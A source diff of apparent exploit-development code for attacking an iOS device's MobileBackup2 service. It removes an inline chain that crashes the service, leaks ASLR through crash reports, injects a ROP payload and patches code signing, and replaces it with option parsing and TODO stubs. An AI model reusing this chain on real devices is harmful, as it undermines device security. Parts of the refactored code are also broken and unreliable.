@@ -20,6 +20,8 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <unistd.h>
+#include <getopt.h>
 
 #include "mb2.h"
 #include "debug.h"
@@ -32,6 +34,12 @@
 #ifdef WIN32
 #define sleep(x) Sleep(x*1000)
 #endif
+
+static struct option longopts[] = {
+	{ "uuid",    required_argument, NULL, 'u' },
+	{ "help",    no_argument,       NULL, 'h' },
+	{ NULL, 0, NULL, 0 }
+};
 
 ////////////////////////////////////////////////////////////////////////////////////////
 // TODO: We need to add an event handler for when devices are connected. This handler //
@@ -78,56 +86,13 @@ int check_ascii_pointer(uint32_t pointer) {
 	return 1;
 }
 
-int main(int argc, char* argv[]) {
-	int err = 0;
-	int k = atoi(argv[1]);
-	// Pass a UUID here if you want to target a single device,
-	//  or NULL to select the first one it finds.
-	printf("Openning device connection\n");
-	device_t* device = device_create(NULL);
-	if (device == NULL) {
-		error("Unable to find a device to use\n");
-		return -1;
-	}
-	//device_enable_debug();
-	srandom(k);
-/*
-	// First we need to discover all the dylib base addresses so we can find our
-	//  ROP gadgets for our payloads. We do this by crashing BackupAgent2 once,
-	//  then downloading the crashreport from the crashreport service.
-	info("Opening connection to MobileBackup2 service\n");
-	mb2_t* mb2 = mb2_connect(device);
-	if (mb2 == NULL) {
-		error("Unable to open connection to MobileBackup2 service\n");
-		device_free(device);
-		return -1;
-	}
-
-	// The second argument here is a pointer to the crashreport_t object containing
-	//  our dylib base address, as well as the state the device was in last time
-	//  it crashed.
-	info("Crashing MobileBackup2 exploit so we can fetch a clean crashreport\n");
-	err = mb2_crash(mb2);
-	if (err < 0) {
-		debug("Unable to crash MobileBackup2 service\n", err);
-		device_free(device);
-		return -1;
-	}
-	mb2_free(mb2);
-	mb2 = NULL;
-
-
-	//while(++k) {
-	info("Giving the device a moment to write the crash report...\n");
-	sleep(3);
-
-	// Here we open crashreporter so we can download the mobilebackup2 crashreport
+crashreport_t* fetch_crashreport(device_t* device) {
+	// We open crashreporter so we can download the mobilebackup2 crashreport
 	//  and parse the "random" dylib addresses. Thank you ASLR for nothing. ;P
 	info("Opening connection to CrashReporter service\n");
 	crashreporter_t* reporter = crashreporter_connect(device);
 	if (reporter == NULL) {
 		error("Unable to open connection to crash reporter\n");
-		device_free(device);
 		return -1;
 	}
 
@@ -138,127 +103,139 @@ int main(int argc, char* argv[]) {
 	crashreport_t* crash = crashreporter_last_crash(reporter);
 	if (crash == NULL) {
 		error("Unable to read last crash\n");
-		device_free(device);
 		return -1;
 	}
 	crashreporter_free(reporter);
+	return crash;
+}
 
-	char pc[0x20];
-	memset(pc, '\0', 0x20);
-	snprintf(pc, 0x1F, "0x%08x", crash->state->pc);
-	debug("Found PC of %s\n", pc);
-	mkdir(pc, 0700);
-	char* command[0x200];
-	snprintf(command, 0x1FF, "mv BackupAgent* %s", pc);
-	debug("Executing command %s\n", command);
-	system(command);
-*/
-	// Open and initialize a connection to MobileBackup2 service again to perform
-	//  our injection exploit
-	info("Opening connection to backup service\n");
-	mb2_t* mb2 = mb2_connect(device);
-	if (mb2 == NULL) {
-		error("Unable to open connection to MobileBackup2 service\n");
-		device_free(device);
-		return -1;
-	}
+int prepare_attack() {
+	return 0;
+}
 
-	// TODO: This code here needs to be stuck in a separate function, it looks ugly here
-	int i = 0;
-	int found = 0;
-	uint32_t address = 0;
-	// Loop through each ROP gadget for this firmware and find one in a nice ascii
-	//  safe address for our stack pivot
-	//for (i = 0; offsets[i].offset != 0; i++) {
-		//address = crash->dylibs[2]->offset + offsets[i].offset;
-		//check_ascii_string((const char*) address, 4);
-	//}
+int bruteforce_string() {
+	return 0;
+}
 
-	//if (found == 0) {
-		//error("Unable to find ASCII safe gadget address for stack pivot\n");
-		//return -1;
-	//}info("Usable ASCII safe gadget address found at 0x%08x\n", address);
+void usage(int argc, char* argv[]) {
+	char* name = strrchr(argv[0], '/');
+	printf("Usage: %s [OPTIONS]\n", (name ? name + 1 : argv[0]));
+	printf("Restore/upgrade IPSW firmware FILE to an iPhone/iPod Touch.\n");
+	printf("  General\n");
+	printf("    -h, --help\t\t\tprints usage information\n");
+	printf("    -v, --verbose\t\tprints debuging info while running\n");
+	printf("    -u, --uuid UUID\t\ttarget specific device by its 40-digit device UUID\n");
+	printf("\n  Brute Forcing\n");
+	printf("    -l, --loop AMOUNT\t\tloop the attack AMOUNT number of times\n");
+	printf("    -s, --salt NUMBER\t\tsalt the random number generator with this number\n");
+	printf("    -e, --entropy NUMBER\tdecides how random we make our fuzzing attack\n");
+	printf("\n  Payload Generation\n");
+	printf("    -t, --target ADDRESS\toffset to ROP gadget we want to execute\n");
+	printf("    -p, --pointer ADDRESS\theap address we're hoping contains our target\n");
+	printf("    -a, --aslr-slide OFFSET\tvalue of randomized dyldcache slide\n");
+	printf("    -c, --cache FILE\t\tcurrent devices dyldcache for finding ROP gadget\n");
+	printf("    -d, --dylib NAME\t\tname of dylib to search for ROP gadget in\n");
+	printf("\n");
+}
 
-	int size = 0;
-	char* attack = NULL;
-		debug("Salt = %d\n", k);
-		err = dictionary_make_attack(address, k, &attack, &size);
-		if (err < 0) {
-			error("Unable to make dictionary attack string for injection\n");
+int main(int argc, char* argv[]) {
+	int opt = 0;
+	int optindex = 0;
+
+	int verbose = 0;
+	char* dylib = NULL;
+	char* cache = NULL;
+	int aslr_slide = 0;
+	char* pointer = NULL;
+	char* target = NULL;
+	int entropy = 0;
+	int salt = 0;
+	char* uuid = NULL;
+	int loop = 0;
+
+	while ((opt = getopt_long(argc, argv, "hvd:c:a:p:t:e:s:u:l:", longopts, &optindex)) > 0) {
+		switch (opt) {
+		case 'h':
+			usage(argc, argv);
+			return 0;
+
+		case 'v':
+			verbose++;
+			break;
+
+		case 'd':
+			dylib = optarg;
+			break;
+
+		case 'c':
+			cache = optarg;
+			break;
+
+		case 'a':
+			aslr_slide = atoi(optarg);
+			break;
+
+		case 'p':
+			pointer = optarg;
+			break;
+
+		case 't':
+			target = optarg;
+			break;
+
+		case 'e':
+			entropy = atoi(optarg);
+			break;
+
+		case 's':
+			salt = atoi(optarg);
+			break;
+
+		case 'u':
+			uuid = optarg;
+			break;
+
+		case 'l':
+			loop = atoi(optarg);
+			break;
+
+		default:
+			usage(argc, argv);
 			return -1;
 		}
-
-
-	debug("Press any key to crash application...\n");
-	//getchar();
-
-	// Due to Apple's new ASLR, before we can overwrite stack with our ROP payload,
-	//  we're going to need to figure out where our data is being stored. Heap
-	//  and stack are randomized on each execution.
-	info("Injecting ROP payload and leaking it's addresss\n");
-	err = mb2_inject(mb2, attack, size);
-	if (err < 0) {
-		error("Unable to inject ROP payload or discover it's offset\n");
-		device_free(device);
-		return -1;
 	}
-	//mb2_free(mb2);
-	//}
-	// Now that we know where our data is, and we know where all the code is, we can
-	//  pivot the stack onto our ROP payload and execute our kernel vulnerability.
-	info("Executing kernel exploit and patching codesign\n");
-	err = mb2_exploit(mb2);
-	if (err < 0) {
-		error("Unable to execute kernel exploit and patch codesign\n");
-		device_free(device);
+
+	if ((argc-optind) == 1) {
+		argc -= optind;
+		argv += optind;
+
+	} else {
+		usage(argc, argv);
 		return -1;
 	}
 
-	info("Giving the device a moment to write the crash report...\n");
-	sleep(3);
-
-	// Here we open crashreporter so we can download the mobilebackup2 crashreport
-	//  and parse the "random" dylib addresses. Thank you ASLR for nothing. ;P
-	info("Opening connection to CrashReporter service\n");
-	crashreporter_t* reporter = crashreporter_connect(device);
-	if (reporter == NULL) {
-		error("Unable to open connection to crash reporter\n");
-		device_free(device);
+	device_t* device = device_create(uuid);
+	if(device == NULL) {
+		error("Unable to open device\n");
 		return -1;
 	}
 
-	// Read in the last crash since that's probably our fault anyways. Since dylib
-	//  addresses are only randomized on boot, we now have base addresses to
-	//  calculate the addresses of our ROP gadgets we need.
-	info("Reading in crash reports from mobile backup\n");
-	crashreport_t* crash = crashreporter_last_crash(reporter, k);
-	if (crash == NULL) {
-		error("Unable to read last crash\n");
-		device_free(device);
+	crashreport_t* crash = fetch_crashreport(device);
+	if(crash == NULL) {
+		error("Unable to get crashreport from device\n");
 		return -1;
 	}
-	crashreporter_free(reporter);
-	//printf("200 %d\n\n", k);
 
-	char pc[0x20];
-	memset(pc, '\0', 0x20);
-	snprintf(pc, 0x1F, "0x%08x", crash->state->lr);
-	debug("Found PC of %s\n", pc);
-	mkdir(pc, 0700);
-	char* command[0x200];
-	snprintf(command, 0x1FF, "mv BackupAgent* %s", pc);
-	debug("Executing command %s\n", command);
-	system(command);
+	// TODO: Guess heap address
+	// TODO: Craft attack string
+	// TODO: Open Dyldcache
+	// TODO: Find ROP offset
+	// TODO: Open connection to mobilebackup
+	// TODO: Register for mobilebackup download callback
+	// TODO: Spray mobilebackup heap with function address
+	// TODO: Send attack string to mobilebackup
+	// TODO: If we crashed then grab the crashreport and repeat
 
-	// All done, not sure if we should clean this up yet
-	info("Closing MobileBackup2 service\n");
-	if (mb2) mb2_free(mb2);
-
-	// If open, then close and free structures
-	info("Cleaning up\n");
-	//if (crash) crashreport_free(crash);
-
-	if (device) device_free(device);
-	info("Done\n");
+	if(device) device_free(device);
 	return 0;
 }
